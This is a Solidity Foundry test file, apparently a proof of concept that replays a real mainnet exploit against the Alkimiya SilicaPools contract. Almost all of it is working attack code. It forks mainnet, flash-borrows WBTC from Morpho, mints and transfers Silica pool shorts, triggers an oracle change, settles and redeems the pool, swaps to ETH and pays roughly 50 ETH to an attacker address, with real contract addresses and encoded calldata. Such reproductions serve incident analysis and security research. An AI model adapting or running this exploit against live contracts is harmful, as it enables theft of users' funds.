
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 22146339;
    uint256 constant TX_TIMESTAMP = 1743176087;
    uint256 constant TX_BLOCK_NUMBER = 22146340;
    uint256 constant TX_VALUE = 999;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        AlkimyaAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (AlkimyaAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = AlkimyaAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new AlkimyaAttack();
        }
    }

    function _prepareProfit(AlkimyaAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(AlkimyaAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_229B83_5D5F, address(0), Addresses.ZERO, "ETH", 50834053044409908846);
        _expectProfit(Addresses.attack_contract, ATTACKER_EOA, Addresses.ZERO, "ETH", 48329612233509594734);
    }
}

contract AlkimyaAttack {
    function attack() external payable {
        _executeAttack();
    }

    function flashCallback() internal {
        _replayDone[MORPHO_FLASH_CALLBACK] = true;
        fundSilicaMint();
        transferSilicaShorts();
        refreshOracle();
        settleSilicaPool();
        redeemSilicaShort();
    }

    function fundSilicaMint() internal {
        IERC20Like(Addresses.WBTC).transfer(Addresses.SilicaPools, 56125794);
        ISilicaPools(Addresses.SilicaPools)
            .collateralizedMint(
                SilicaPoolSpec({
                    indexStart: 41,
                    indexEnd: 46,
                    oracle: Addresses.A_918873_7BDB,
                    startTime: 1743176087,
                    endTime: 1743176087,
                    paymentToken: Addresses.WBTC
                }),
                bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000"),
                0x100000000000000000000000000000001,
                address(this),
                address(this)
            );
    }

    function transferSilicaShorts() internal {
        ISilicaPools(Addresses.SilicaPools)
            .safeTransferFrom(
                address(this),
                Addresses.A_CC3A5D_C481,
                0x26724a1c82d35f588854e4861321596b5148475cd3f7cda81c28343b1bcd64c8,
                340282366920938463463374607431768211455,
                hex""
            );
        ISilicaPools(Addresses.SilicaPools)
            .safeTransferFrom(
                address(this),
                Addresses.A_CC3A5D_C481,
                0x26724a1c82d35f588854e4861321596b5148475cd3f7cda81c28343b1bcdc8d5,
                340282366920938463463374607431768211455,
                hex""
            );
    }

    function refreshOracle() internal {
        IRateOracle(Addresses.A_918873_7BDB).change();
    }

    function settleSilicaPool() internal {
        SilicaPoolSpec memory poolSpec = _silicaPoolSpec();
        ISilicaPools(Addresses.SilicaPools).startPool(poolSpec);
        ISilicaPools(Addresses.SilicaPools).endPool(poolSpec);
    }

    function redeemSilicaShort() internal {
        ISilicaPools(Addresses.SilicaPools).redeemShort(_silicaPoolSpec());
    }

    function _executeAttack() internal {


        approveSilicaPools();
        borrowWbtcFromMorpho();
        quoteWbtcBalance();
        swapWbtcForWeth();
        unwrapWethProfit();
        sendEthProfit();
    }

    function approveSilicaPools() internal {
        IERC20Like(Addresses.WBTC).approve(Addresses.SilicaPools, type(uint256).max);
    }

    function borrowWbtcFromMorpho() internal {
        IERC20Like(Addresses.WBTC).approve(Addresses.Morpho, type(uint256).max);
        bytes memory callbackUserData =
            hex"cb000000442260fac5e5542a773aa44fbcfedf7c193bc2c599a9059cbb000000000000000000000000f3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde000000000000000000000000000000000000000000000000000000000358696200000144f3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde71e109d40000000000000000000000000000000000000000000000000000000000000029000000000000000000000000000000000000000000000000000000000000002e0000000000000000000000009188738a7ca1e4b2af840a77e8726cc6dcbe7bdb0000000000000000000000000000000000000000000000000000000067e6c1970000000000000000000000000000000000000000000000000000000067e6c1970000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000100000000000000000000000080bf7db69556d9521c03461978b8fc731dbbd4e400000000000000000000000080bf7db69556d9521c03461978b8fc731dbbd4e4000000c4f3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bdef242432a00000000000000000000000080bf7db69556d9521c03461978b8fc731dbbd4e4000000000000000000000000cc3a5dc003b3a58621745a39f706ef9646d5c48126724a1c82d35f588854e4861321596b5148475cd3f7cda81c28343b1bcd64c800000000000000000000000000000000ffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000000000c4f3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bdef242432a00000000000000000000000080bf7db69556d9521c03461978b8fc731dbbd4e4000000000000000000000000cc3a5dc003b3a58621745a39f706ef9646d5c48126724a1c82d35f588854e4861321596b5148475cd3f7cda81c28343b1bcdc8d500000000000000000000000000000000ffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000000000049188738a7ca1e4b2af840a77e8726cc6dcbe7bdb2ee79ded000000c4f3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde19b875560000000000000000000000000000000000000000000000000000000000000029000000000000000000000000000000000000000000000000000000000000002e0000000000000000000000009188738a7ca1e4b2af840a77e8726cc6dcbe7bdb0000000000000000000000000000000000000000000000000000000067e6c1970000000000000000000000000000000000000000000000000000000067e6c1970000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599000000c4f3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde312f14ba0000000000000000000000000000000000000000000000000000000000000029000000000000000000000000000000000000000000000000000000000000002e0000000000000000000000009188738a7ca1e4b2af840a77e8726cc6dcbe7bdb0000000000000000000000000000000000000000000000000000000067e6c1970000000000000000000000000000000000000000000000000000000067e6c1970000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599000000c4f3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde3305d6b10000000000000000000000000000000000000000000000000000000000000029000000000000000000000000000000000000000000000000000000000000002e0000000000000000000000009188738a7ca1e4b2af840a77e8726cc6dcbe7bdb0000000000000000000000000000000000000000000000000000000067e6c1970000000000000000000000000000000000000000000000000000000067e6c1970000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599000000000000000000000000000000000000000000000000000000000621bc";
        IMorpho(Addresses.Morpho).flashLoan(Addresses.WBTC, 1000000000, callbackUserData);
    }

    function quoteWbtcBalance() internal view {
        uint256 wbtcBalance = IERC20Like(Addresses.WBTC).balanceOf(address(this));
        wbtcBalance;
    }

    function swapWbtcForWeth() internal {
        IUniswapV3Pool(Addresses.UniswapV3Pool)
            .swap(
                address(this),
                true,
                int256(114015390),
                uint160(4295128740),
                abi.encode(uint256(91830346618731900605109801406220007125328005673863944418755145087688038684348))
            );
    }

    function unwrapWethProfit() internal {
        IWETH(Addresses.WETH).withdraw(50884937982392301148);
    }

    function sendEthProfit() internal {
        uint256 payoutAmount = address(this).balance;
        if (payoutAmount > 50834053044409908846) payoutAmount = 50834053044409908846;
        (bool ok,) = payable(Addresses.A_229B83_5D5F).call{value: payoutAmount}("");
        ok;
    }

    function acceptSilicaNft() internal {
        _replayDone[SILICA_NFT_CALLBACK_1] = true;
    }

    function acceptSilicaNft2() internal {
        _replayDone[SILICA_NFT_CALLBACK_2] = true;
    }

    function swapCallback() internal {
        _replayDone[UNISWAP_SWAP_CALLBACK] = true;
        IERC20Like(Addresses.WBTC).transfer(Addresses.UniswapV3Pool, 114015390);
    }

    function _silicaPoolSpec() internal pure returns (SilicaPoolSpec memory) {
        return SilicaPoolSpec({
            indexStart: 41,
            indexEnd: 46,
            oracle: Addresses.A_918873_7BDB,
            startTime: 1743176087,
            endTime: 1743176087,
            paymentToken: Addresses.WBTC
        });
    }

    receive() external payable {}

    function onMorphoFlashLoan(uint256 borrowedAmount, bytes calldata callbackUserData) external payable {
        borrowedAmount;
        callbackUserData;
        if (!_replayDone[MORPHO_FLASH_CALLBACK]) flashCallback();
        bytes memory returnData = hex"";
        assembly { return(add(returnData, 32), mload(returnData)) }
    }

    function yoink() external payable {
        _executeAttack();
        return;
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 tokenId,
        uint256 amount,
        bytes calldata transferData
    ) external payable {
        operator;
        from;
        tokenId;
        amount;
        transferData;
        uint256 callbackSequenceIndex = _nextDispatch(0xf23a6e61);
        if (callbackSequenceIndex == 0) {
            if (!_replayDone[SILICA_NFT_CALLBACK_1]) acceptSilicaNft();
            bytes memory firstReturn = hex"f23a6e6100000000000000000000000000000000000000000000000000000000";
            assembly { return(add(firstReturn, 32), mload(firstReturn)) }
        }
        if (callbackSequenceIndex == 1) {
            if (!_replayDone[SILICA_NFT_CALLBACK_2]) acceptSilicaNft2();
            bytes memory secondReturn = hex"f23a6e6100000000000000000000000000000000000000000000000000000000";
            assembly { return(add(secondReturn, 32), mload(secondReturn)) }
        }
        if (!_replayDone[SILICA_NFT_CALLBACK_1]) acceptSilicaNft();
        bytes memory defaultReturn = hex"f23a6e6100000000000000000000000000000000000000000000000000000000";
        assembly { return(add(defaultReturn, 32), mload(defaultReturn)) }
    }

    fallback() external payable {
        if (msg.sig == 0xfa461e33) {
            if (!_replayDone[UNISWAP_SWAP_CALLBACK]) swapCallback();
            bytes memory returnData = hex"";
            assembly { return(add(returnData, 32), mload(returnData)) }
        }
        acceptEthCallback();
    }

    function acceptEthCallback() internal {}

    bytes32 private constant MORPHO_FLASH_CALLBACK = keccak256("poc.morpho.flash");
    bytes32 private constant SILICA_NFT_CALLBACK_1 = keccak256("poc.silica.nft.1");
    bytes32 private constant SILICA_NFT_CALLBACK_2 = keccak256("poc.silica.nft.2");
    bytes32 private constant UNISWAP_SWAP_CALLBACK = keccak256("poc.uniswap.swap");
    mapping(bytes32 => bool) private _replayDone;

    mapping(bytes4 => uint256) private _dispatchCursor;

    function _nextDispatch(bytes4 callSig) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[callSig];
        _dispatchCursor[callSig] = ordinal + 1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant A_229B83_5D5F = 0x229b8325bb9Ac04602898B7e8989998710235d5f;
    address internal constant UniswapV3Pool = 0x4585FE77225b41b697C938B018E2Ac67Ac5a20c0;
    address internal constant attack_contract = 0x80BF7Db69556D9521c03461978B8fC731DBBD4e4;
    address internal constant A_918873_7BDB = 0x9188738a7cA1E4B2af840a77e8726cC6Dcbe7Bdb;
    address internal constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant A_CC3A5D_C481 = 0xcC3a5dC003b3a58621745A39f706eF9646D5c481;
    address internal constant SilicaPools = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;
    address internal constant attacker_eoa = 0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A;
}

struct SilicaPoolSpec {
    uint128 indexStart;
    uint128 indexEnd;
    address oracle;
    uint48 startTime;
    uint48 endTime;
    address paymentToken;
}

interface IRateOracle {
    function change() external;
}

interface IMorpho {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface ISilicaPools {
    function collateralizedMint(SilicaPoolSpec calldata, bytes32, uint256, address, address) external;
    function endPool(SilicaPoolSpec calldata) external;
    function redeemShort(SilicaPoolSpec calldata) external;
    function safeTransferFrom(address, address, uint256, uint256, bytes calldata) external;
    function startPool(SilicaPoolSpec calldata) external;
}

interface IUniswapV3Pool {
    function swap(address, bool, int256, uint160, bytes calldata) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
    function withdraw(uint256) external;
}
